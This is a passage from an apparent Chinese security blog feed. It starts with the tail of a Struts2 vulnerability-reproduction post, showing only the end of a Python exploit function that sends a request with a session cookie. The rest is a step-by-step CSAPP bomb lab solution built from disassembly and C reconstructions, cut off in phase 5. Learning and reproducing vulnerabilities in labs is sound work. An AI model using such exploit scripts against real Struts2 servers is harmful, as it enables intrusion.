class="string">&quot;5FB38EE1263573DD04E7EAF6C23978EE&quot;</span>&#125;</span><br><span class="line">    data = &#123;<span class="string">&quot;name&quot;</span>: name, <span class="string">&quot;email&quot;</span>: email,<span class="string">&quot;age&quot;</span>: age&#125;</span><br><span class="line">    req = requests.post(url, data=data, cookies=cookies)</span><br><span class="line">    <span class="built_in">print</span>(req.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><p>requests库发送请求时不需要进行URL编码，除非我们想二次编码时才这样做。<br><strong>问题</strong>：无法执行带参数的命令。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
          <category> Struts2 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Struts2 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CSAPP-bomblab</title>
      <link href="/2022/04/01/CSAPP-bomblab/"/>
      <url>/2022/04/01/CSAPP-bomblab/</url>
      
        <content type="html"><![CDATA[<h1 id="phase1"><a href="#phase1" class="headerlink" title="phase1"></a>phase1</h1><p><img src="https://s2.loli.net/2022/04/01/qLzFsUV6PCxWiNR.png" alt="image.png"><br>首先使用<code>disas phase_1</code>来得到phase_1函数的汇编代码，接下来进行分析。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">test   %eax,%eax</span><br><span class="line">je     0x400ef7 &lt;phase_1+23&gt;</span><br></pre></td></tr></table></figure><p>是对调用函数的返回值进行比较，如果%rax寄存器也就是<code>strings_not_equal</code>返回值为0则跳转到<code>0x400ef7</code>，结束函数的执行。<br>寄存器<code>%esi</code>存放的是地址<code>$0x402400</code>，%rdi中存放的则是我们所输入字符串的地址，那么该汇编代码就有一下的C语言格式</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">phase_1</span><span class="params">(<span class="keyword">char</span> *c1, <span class="keyword">char</span> *c2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (strings_not_equal(c1, c2))</span><br><span class="line">        explode_bomb();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时只要查看<code>%esi</code>地址处存放的字符串就可以。<br><code>x/1sb 0x402400</code>以字符串格式输出该地址存储的内容。<br>得到<code>Border relations with Canada have never been better.</code>，输入便通过第一关。</p><h1 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h1><p>同样先反编译获得汇编代码。<br><img src="https://s2.loli.net/2022/04/02/vQq6r28tmoMFxHZ.png" alt="image.png"><br>首先调用了<code>read_six_numbers</code>函数，根据名字就知道该函数会读取六个数字，之后主要分析存在跳转语句的部分。<br><code>cmpl</code>是比较32位的部分，l代表两个字的大小，一个字是16位。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmpl   $0x1,(%rsp)</span><br><span class="line">je     0x400f30 &lt;phase_2+52&gt;</span><br></pre></td></tr></table></figure><p>所以我们需要让<code>%rsp</code>地址处存储的值为1，即输入的第一个数为1，因为之前有操作将<code>%rsp</code>的地址作为参数<code>%rsi</code>传入了函数。<br>跟进，接下来的操作如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000400f30 &lt;+52&gt;:lea    0x4(%rsp),%rbx</span><br><span class="line">0x0000000000400f35 &lt;+57&gt;:lea    0x18(%rsp),%rbp</span><br><span class="line">0x0000000000400f17 &lt;+27&gt;:mov    -0x4(%rbx),%eax</span><br><span class="line">0x0000000000400f1a &lt;+30&gt;:add    %eax,%eax</span><br><span class="line">0x0000000000400f1c &lt;+32&gt;:cmp    %eax,(%rbx)</span><br><span class="line">0x0000000000400f1e &lt;+34&gt;:je     0x400f25 &lt;phase_2+41&gt;</span><br><span class="line">0x0000000000400f25 &lt;+41&gt;:add    $0x4,%rbx</span><br><span class="line">0x0000000000400f29 &lt;+45&gt;:cmp    %rbp,%rbx</span><br><span class="line">0x0000000000400f2c &lt;+48&gt;:jne    0x400f17 &lt;phase_2+27&gt;</span><br><span class="line">0x0000000000400f2e &lt;+50&gt;:jmp    0x400f3c &lt;phase_2+64&gt;</span><br></pre></td></tr></table></figure><p>如果想要通过，我们必须要让<code>%rbp</code>的值与<code>%rbx</code>的值相等。<br>那么问题来了，<code>%rbx</code>与<code>%rbp</code>中的值是什么呢？通过最开始的两条指令我们知道了这两个寄存器是根据<code>%rsp</code>计算出来的地址。<br>那么我们就先按第一次来看看，各个寄存器分别存储哪个输入的值。<br>rbx：第二个参数地址 2<br>rbp：第七个参数地址（并不存在，而是作为一个条件）<br>eax：第一个参数自加一次 2<br>eax与rbx比较相等 2<br><img src="https://s2.loli.net/2022/04/02/jpuBnrLRG7qi394.png" alt="image.png"><br>rbx+4后地址与rbp值相等<br>好了那大概意思是第一个和第二个参数固定，之后第三、四、五个参数一直是前一个参数的二倍，到第六个参数结束。<br>经过调试发现<code>%rdi</code>存储输入的六个数字。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">phase_2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> p[<span class="number">6</span>];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d %d %d %d&quot;</span>, </span><br><span class="line">                &amp;p[<span class="number">1</span>], &amp;p[<span class="number">2</span>], &amp;p[<span class="number">3</span>], &amp;p[<span class="number">4</span>], &amp;p[<span class="number">5</span>], &amp;p[<span class="number">6</span>]);</span><br><span class="line">    c1 = p + <span class="number">4</span>;</span><br><span class="line">    c2 = p + <span class="number">4</span> * <span class="number">6</span>;</span><br><span class="line">    <span class="keyword">if</span> (p[<span class="number">1</span>] == <span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>(c1 != c2)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> ((*c1 - <span class="number">4</span>) * <span class="number">2</span> == *(c1))</span><br><span class="line">            &#123;</span><br><span class="line">                c1 += <span class="number">4</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                explode_bomb();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    explode_bomb();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>待补充更加人性化的版本。</p><h1 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h1><p><img src="https://s2.loli.net/2022/04/02/nztDKbJ7FV1Gpqu.png" alt="image.png"></p><h2 id="不引爆炸弹的程序流"><a href="#不引爆炸弹的程序流" class="headerlink" title="不引爆炸弹的程序流"></a>不引爆炸弹的程序流</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000400f47 &lt;+4&gt;:lea    0xc(%rsp),%rcx</span><br><span class="line">0x0000000000400f4c &lt;+9&gt;:lea    0x8(%rsp),%rdx</span><br><span class="line">0x0000000000400f5b &lt;+24&gt;:callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">0x0000000000400f60 &lt;+29&gt;:cmp    $0x1,%eax</span><br><span class="line">0x0000000000400f63 &lt;+32&gt;:jg     0x400f6a &lt;phase_3+39&gt;</span><br><span class="line">0x0000000000400f6a &lt;+39&gt;:cmpl   $0x7,0x8(%rsp)</span><br><span class="line">0x0000000000400f6f &lt;+44&gt;:ja     0x400fad &lt;phase_3+106&gt;</span><br><span class="line">0x0000000000400f71 &lt;+46&gt;:mov    0x8(%rsp),%eax</span><br><span class="line">0x0000000000400f75 &lt;+50&gt;:jmpq   *0x402470(,%rax,8)</span><br><span class="line">0x0000000000400fbe &lt;+123&gt;:cmp    0xc(%rsp),%eax</span><br><span class="line">0x0000000000400fc2 &lt;+127&gt;:je     0x400fc9 &lt;phase_3+134&gt;</span><br><span class="line">0x0000000000400fc4 &lt;+129&gt;:callq  0x40143a &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure><p><code>%rdx</code>存储第一个输入的地址<code>%rsp+0x8</code>，<code>%rcx</code>存储第二个输入的地址<code>%rsp+0x8</code>。<br>一个跳转表，如果索引大于7则跳转到默认情况调用<code>explode_bomb</code>函数<br>x/4xg 0x402470可以看到跳转表各部分存储的地址。<br><img src="https://s2.loli.net/2022/04/02/lxFbQUkCRipnB9a.png" alt="image.png">，地址是8字节对齐的。<br>所以需要满足以下两个条件：</p><ol><li>索引不能大于7</li><li>第二个输入的参数必须与对应分支的数相等</li></ol><p>输入：0 207(0xcf)</p><h2 id="对应C代码"><a href="#对应C代码" class="headerlink" title="对应C代码"></a>对应C代码</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">phase_3</span><span class="params">(<span class="keyword">int</span> a[<span class="number">2</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> tmp;</span><br><span class="line">    <span class="keyword">switch</span>(a[<span class="number">0</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// .代表省略 数值直接查看汇编代码</span></span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            tmp=.; </span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            tmp=.; </span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            tmp=.; </span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            tmp=.; </span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            tmp=.; </span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">            tmp=.; </span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">            tmp=.; </span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">            tmp=.; </span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            exploded_bomb();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (tmp != a[<span class="number">1</span>])</span><br><span class="line">        exploded_bomb();</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h1><p><img src="https://s2.loli.net/2022/04/04/AvuWqj8FUN4YeBb.png" alt="image.png"><br>通过查看代码，首先找出在不引爆炸弹情况下的程序流程。</p><h2 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x000000000040100c &lt;+0&gt;:sub    $0x18,%rsp</span><br><span class="line">0x0000000000401010 &lt;+4&gt;:lea    0xc(%rsp),%rcx</span><br><span class="line">0x0000000000401015 &lt;+9&gt;:lea    0x8(%rsp),%rdx</span><br><span class="line">0x000000000040101a &lt;+14&gt;:mov    $0x4025cf,%esi</span><br><span class="line">0x000000000040101f &lt;+19&gt;:mov    $0x0,%eax</span><br><span class="line">0x0000000000401024 &lt;+24&gt;:callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">0x0000000000401029 &lt;+29&gt;:cmp    $0x2,%eax</span><br><span class="line">0x000000000040102c &lt;+32&gt;:jne    0x401035 &lt;phase_4+41&gt;</span><br><span class="line">0x000000000040102e &lt;+34&gt;:cmpl   $0xe,0x8(%rsp)</span><br><span class="line">0x0000000000401033 &lt;+39&gt;:jbe    0x40103a &lt;phase_4+46&gt;</span><br><span class="line">0x0000000000401035 &lt;+41&gt;:callq  0x40143a &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure><p>我们需要输入两个整数类型的参数，并且第一个参数小于等于14，这个参数是无符号类型的。</p><div class="note info simple"><p>回想：汇编下存储的各种类型数据都是一样的，比较时根据操作符来判断具体是什么类型的比较。<br>比如：jb代表无符号小于，jl代表有符号小于。</p></div>   <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x000000000040103a &lt;+46&gt;:mov    $0xe,%edx</span><br><span class="line">0x000000000040103f &lt;+51&gt;:mov    $0x0,%esi</span><br><span class="line">0x0000000000401044 &lt;+56&gt;:mov    0x8(%rsp),%edi</span><br><span class="line">0x0000000000401048 &lt;+60&gt;:callq  0x400fce &lt;func4&gt;</span><br><span class="line">0x000000000040104d &lt;+65&gt;:test   %eax,%eax</span><br><span class="line">0x000000000040104f &lt;+67&gt;:jne    0x401058 &lt;phase_4+76&gt;</span><br></pre></td></tr></table></figure><h2 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h2><p>这里将第一个输入值、0和14作为参数传入了函数<code>func4</code>。我们需要做的是让函数的返回值不为0。<br>func4函数：<br><img src="https://s2.loli.net/2022/04/04/vnoMjhAHCiZP9TV.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000400fd2 &lt;+4&gt;:mov    %edx,%eax</span><br><span class="line">0x0000000000400fd4 &lt;+6&gt;:sub    %esi,%eax</span><br><span class="line">0x0000000000400fd6 &lt;+8&gt;:mov    %eax,%ecx</span><br><span class="line">0x0000000000400fd8 &lt;+10&gt;:shr    $0x1f,%ecx</span><br><span class="line">0x0000000000400fdb &lt;+13&gt;:add    %ecx,%eax</span><br><span class="line">0x0000000000400fdd &lt;+15&gt;:sar    %eax</span><br><span class="line">0x0000000000400fdf &lt;+17&gt;:lea    (%rax,%rsi,1),%ecx</span><br></pre></td></tr></table></figure><p>先来看看开头的一系列数值操作，第三个参数14减去第二个参数0（这里目标是右边的参数），之后将结果<strong>逻辑右移</strong>0x1f（右移最高位填0），将上一步结果与右移前结果相加，然后再算数右移一位。最后将结果与第二个参数相加。<br>等价于<code>((14-0) &gt;&gt; (H) 31 + 14) &gt;&gt; (A) 1 + 0=7</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000400fe2 &lt;+20&gt;:cmp    %edi,%ecx</span><br><span class="line">0x0000000000400fe4 &lt;+22&gt;:jle    0x400ff2 &lt;func4+36&gt;</span><br><span class="line">0x0000000000400ff2 &lt;+36&gt;:mov    $0x0,%eax</span><br><span class="line">0x0000000000400ff7 &lt;+41&gt;:cmp    %edi,%ecx</span><br><span class="line">0x0000000000400ff9 &lt;+43&gt;:jge    0x401007 &lt;func4+57&gt;</span><br><span class="line">0x0000000000401007 &lt;+57&gt;:add    $0x8,%rsp</span><br><span class="line">0x000000000040100b &lt;+61&gt;:retq</span><br></pre></td></tr></table></figure><p>上面是我们想要的程序流程。第一个参数与计算结果比较，结果应该小于等于第一个参数。之后结果又大于等于第一个参数，那么我们可以直接让两个参数相等。也就是输入的第一个值应该为7。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000401051 &lt;+69&gt;:cmpl   $0x0,0xc(%rsp)</span><br><span class="line">0x0000000000401056 &lt;+74&gt;:je     0x40105d &lt;phase_4+81&gt;</span><br><span class="line">0x0000000000401058 &lt;+76&gt;:callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">0x000000000040105d &lt;+81&gt;:add    $0x18,%rsp</span><br><span class="line">0x0000000000401061 &lt;+85&gt;:retq   </span><br></pre></td></tr></table></figure><p>接下来让输入的第二个参数为0即可。</p><h2 id="C语言版本"><a href="#C语言版本" class="headerlink" title="C语言版本"></a>C语言版本</h2><h3 id="func4"><a href="#func4" class="headerlink" title="func4"></a>func4</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func4</span><span class="params">(<span class="keyword">int</span> rdi, <span class="keyword">int</span> rsi = <span class="number">0</span>, <span class="keyword">int</span> rdx = <span class="number">14</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> tmp, ret;</span><br><span class="line">    ret = rdx - rsi;</span><br><span class="line">    ret = (<span class="keyword">unsigned</span>)ret &gt;&gt; <span class="number">31</span>;  <span class="comment">// 可能取值为0或1 因为迭代有可能计算出负数来</span></span><br><span class="line">    ret += rdx;</span><br><span class="line">    ret &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    tmp = ret + rsi; <span class="comment">// 第一次迭代为7</span></span><br><span class="line">    <span class="keyword">if</span> (rdi &gt;= tmp)</span><br><span class="line">    &#123;</span><br><span class="line">      ret = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> (rdi == tmp)</span><br><span class="line">      &#123;  </span><br><span class="line">         <span class="keyword">return</span> ret;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">         ret = func4(rdi, tmp+<span class="number">1</span>, <span class="number">14</span>);</span><br><span class="line">         ret = ret * <span class="number">2</span> + <span class="number">1</span>;</span><br><span class="line">         <span class="keyword">return</span> ret;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">       ret = func4(rdi, <span class="number">0</span>, tmp<span class="number">-1</span>);</span><br><span class="line">       ret *= <span class="number">2</span>;</span><br><span class="line">       <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以传入的参数范围是[0,14]，通关的结果不止上面一种结果，只不过7是最简单的一个。其它数值可以经过多次函数递归后得到与7一样的结果，这个需要我们自己去进行列举。<br>最后得到下面几个序列：</p><ul><li>0 0</li><li>1 0</li><li>3 0</li><li>7 0</li></ul><p>为什么大于7不可以？因为大于7时执行的是<code>ret = ret * 2 + 1</code>，如果想要等于0，则需要最后调用<code>func4</code>返回的结果为<code>1|31位0|</code>，根据前面右移计算和rdx的大小可以知到这样的结果是不会出现的。<br>同样的，如果小于7里面的数有执行该操作的，那么它最终也不会成功的返回0。</p><h3 id="phase-4-1"><a href="#phase-4-1" class="headerlink" title="phase_4"></a>phase_4</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">phase_4</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> p1, <span class="keyword">unsigned</span> <span class="keyword">int</span> p2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    ret = <span class="built_in">scanf</span>(<span class="string">&quot;%d  %d&quot;</span>, &amp;p1, &amp;p2);</span><br><span class="line">    <span class="keyword">if</span> (ret != <span class="number">2</span>)</span><br><span class="line">        explode_bomb();</span><br><span class="line">    <span class="keyword">if</span> (p1 &gt; <span class="number">14</span>)</span><br><span class="line">        explode_bomb();</span><br><span class="line">    ret = func4(p1, <span class="number">0</span>, <span class="number">14</span>);</span><br><span class="line">    <span class="keyword">if</span> (ret != <span class="number">0</span>)</span><br><span class="line">        explode_bomb();</span><br><span class="line">    <span class="keyword">if</span> (p2 != <span class="number">0</span>)</span><br><span class="line">        explode_bomb()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h1><p><img src="https://s2.loli.net/2022/04/05/ez7XUkQ5SPc9m4h.png" alt="image.png"><br><code>   0x000000000040106a &lt;+8&gt;:    mov    %fs:0x28,%rax</code><br>上面的<code>%fs:0x28</code>指定采用段寻址的方式来从内存中读入金丝雀的值到栈上面。现在只需要知道金丝雀这个功能是为了防止栈溢出的就可以。</p><h2 id="第一部分-1"><a href="#第一部分-1" class="headerlink" title="第一部分"></a>第一部分</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000401073 &lt;+17&gt;:mov    %rax,0x18(%rsp)</span><br><span class="line">0x0000000000401078 &lt;+22&gt;:xor    %eax,%eax</span><br><span class="line">0x000000000040107a &lt;+24&gt;:callq  0x40131b &lt;string_length&gt;</span><br><span class="line">0x000000000040107f &lt;+29&gt;:cmp    $0x6,%eax</span><br><span class="line">0x0000000000401082 &lt;+32&gt;:je     0x4010d2 &lt;phase_5+112&gt;</span><br><span class="line">0x0000000000401084 &lt;+34&gt;:callq  0x40143a &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure><p>我们输入的字符串长度长度必须为6，不包括字符串结束符(0x00)。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x00000000004010d2 &lt;+112&gt;:mov    $0x0,%eax</span><br><span class="line">0x00000000004010d7 &lt;+117&gt;:jmp    0x40108b &lt;phase_5+41&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> 0x000000000040108b &lt;+41&gt;:movzbl (%rbx,%rax,1),%ecx</span><br><span class="line">0x000000000040108f &lt;+45&gt;:mov    %cl,(%rsp)</span><br><span class="line">0x0000000000401092 &lt;+48&gt;:mov    (%rsp),%rdx</span><br><span class="line">0x0000000000401096 &lt;+52&gt;:and    $0xf,%edx</span><br><span class="line">0x0000000000401099 &lt;+55&gt;:movzbl 0x4024b0(%rdx),%edx</span><br><span class="line">0x00000000004010a0 &lt;+62&gt;:mov    %dl,0x10(%rsp,%rax,1)</span><br><span class="line">0x00000000004010a4 &lt;+66&gt;:add    $0x1,%rax</span><br><span class="line">0x00000000004010a8 &lt;+70&gt;:cmp    $0x6,%rax</span><br><span class="line">0x00000000004010ac &lt;+74&gt;:jne    0x40108b &lt;phase_5+41&gt;</span><br></pre></td></tr></table></figure><p>rbx存储着字符串的首地址，rax初始值为0。<br>首先将以rbx为地址内存处的1字节大小的值，零拓展为4字节大小存储到ecx，之后ecx最低的一个字节保存到栈顶，再将从栈顶开始8字节保存到rdx。<br><code>edx &amp; 0xf</code>(取之前1字节字符的低4位)到edx，之后将<code>rdx+0x4024b0</code>内存处第1个字节零扩展成4字节到edx。这里面的edx最终存储的是取出字符二进制形式的低四位。<br><code>0x4024b0</code>地址处存储的值为：<br><code>maduiersnfotvbylSo you think you can stop the bomb with ctrl-c, do you?</code><br>将edx低位1个字节保存到地址为<code>rsp+rax+0x10</code>内存处。<br>之后对<code>rax</code>进行加1，直到为6时结束，初始值为0，所以整个部分相当于循环了6次，rax就是进行迭代的变量。<br>这个实际上就是两块内存处值的互换，只不过必须要以寄存器为中介。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">rsp+0x10</span><br><span class="line">rsp+0x11</span><br><span class="line">rsp+0x12</span><br><span class="line">rsp+0x13</span><br><span class="line">rsp+0x14</span><br><span class="line">rsp+0x15</span><br></pre></td></tr></table></figure><h2 id="第二部分-1"><a href="#第二部分-1" class="headerlink" title="第二部分"></a>第二部分</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x00000000004010ae &lt;+76&gt;:movb   $0x0,0x16(%rsp)</span><br><span class="line">0x00000000004010b3 &lt;+81&gt;:mov    $0x40245e,%esi</span><br><span class="line">0x00000000004010b8 &lt;+86&gt;:lea    0x10(%rsp),%rdi</span><br><span class="line">0x00000000004010bd &lt;+91&gt;:callq  0x401338 &lt;strings_not_equal&gt;</span><br><span class="line">0x00000000004010c2 &lt;+96&gt;:test   %eax,%eax</span><br><span class="line">0x00000000004010c4 &lt;+98&gt;:je     0x4010d9 &lt;phase_5+119&gt;</span><br><span class="line">0x00000000004010c6 &lt;+100&gt;:callq  0x40143a &lt;explode_bomb&gt;</span><br></pre></td></tr></table></figure><p>首先将<code>0x00</code>截断字符保存到<code>rsp+0x16</code>地址处，然后将地址为<code>0x40245e</code>处的字符串与地址为<code>rsp+10</code>处的字符串比较，两者必须要相等。<br><code>rsp+0x10-rsp+0x15</code>处的最终字符串应该为<code>flyers</code><br>而这部分的字符正是根据第一部分计算得来的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x00000000004010d9 &lt;+119&gt;:mov    0x18(%rsp),%rax</span><br><span class="line">0x00000000004010de &lt;+124&gt;:xor    